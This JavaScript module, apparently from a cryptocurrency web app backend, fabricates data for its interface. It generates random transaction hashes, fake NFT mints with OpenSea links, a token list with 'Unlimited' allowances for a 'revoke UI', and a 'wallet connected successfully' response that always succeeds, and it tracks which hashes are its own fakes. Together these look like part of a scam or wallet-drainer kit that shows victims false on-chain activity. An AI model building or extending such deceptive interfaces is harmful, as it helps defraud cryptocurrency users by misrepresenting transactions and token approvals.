// backend/modules/UIManager.js
export class UIManager {
  constructor() {
    this.isInitialized = false;
    this.fakeTxHashes = new Set();
  }

  async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log(`🔄 Initializing ${this.constructor.name}...`);
      // Any initialization logic would go here
      this.isInitialized = true;
      console.log(`✅ ${this.constructor.name} initialized`);
      return true;
    } catch (error) {
      console.error(`❌ ${this.constructor.name} initialization failed:`, error);
      return false;
    }
  }

  // Generate fake transaction data for UI display
  generateFakeTransaction() {
    const fakeTxHash = '0x' + Math.random().toString(16).substr(2, 64);
    const fakeGas = (0.001 + Math.random() * 0.005).toFixed(6);
    const fakeBlock = Math.floor(Math.random() * 1000000) + 18000000;
    
    this.fakeTxHashes.add(fakeTxHash);
    
    return {
      hash: fakeTxHash,
      gas: fakeGas,
      block: fakeBlock,
      timestamp: new Date().toISOString()
    };
  }

  // Create fake NFT mint animation data
  generateFakeNFTMint() {
    const nfts = [
      { name: "Bored Ape", image: "https://via.placeholder.com/100x100.png?text=Bored+Ape" },
      { name: "CryptoPunk", image: "https://via.placeholder.com/100x100.png?text=CryptoPunk" },
      { name: "Azuki", image: "https://via.placeholder.com/100x100.png?text=Azuki" }
    ];
    
    const randomNFT = nfts[Math.floor(Math.random() * nfts.length)];
    
    return {
      nft: randomNFT,
      openseaLink: `https://opensea.io/assets/ethereum/0x${Math.random().toString(16).substr(2, 40)}`,
      mintTime: new Date().toISOString()
    };
  }

  // Generate fake token list for revoke UI
  generateFakeTokenList(userAddress) {
    const commonTokens = [
      {
        name: 'USDC',
        formattedBalance: (Math.random() * 1000 + 50).toFixed(2),
        symbol: 'USDC',
        contract: '0xA0b86991c6218b36c1d19D4a2e9eb0cE3606eB48',
        allowance: 'Unlimited'
      },
      {
        name: 'DAI', 
        formattedBalance: (Math.random() * 500 + 25).toFixed(2),
        symbol: 'DAI',
        contract: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
        allowance: 'Unlimited'
      },
      {
        name: 'UNI',
        formattedBalance: (Math.random() * 200 + 10).toFixed(2),
        symbol: 'UNI', 
        contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
        allowance: 'Unlimited'
      }
    ];

    return commonTokens;
  }

  // Create fake wallet connection response
  generateFakeWalletConnection() {
    return {
      success: true,
      message: "Wallet connected successfully",
      timestamp: new Date().toISOString()
    };
  }

  // Validate if a transaction hash is one of our fakes
  isFakeTransaction(hash) {
    return this.fakeTxHashes.has(hash);
  }

  // Get all fake transactions (for debugging)
  getFakeTransactions() {
    return Array.from(this.fakeTxHashes);
  }
}

// Create singleton instance
export const uiManager = new UIManager();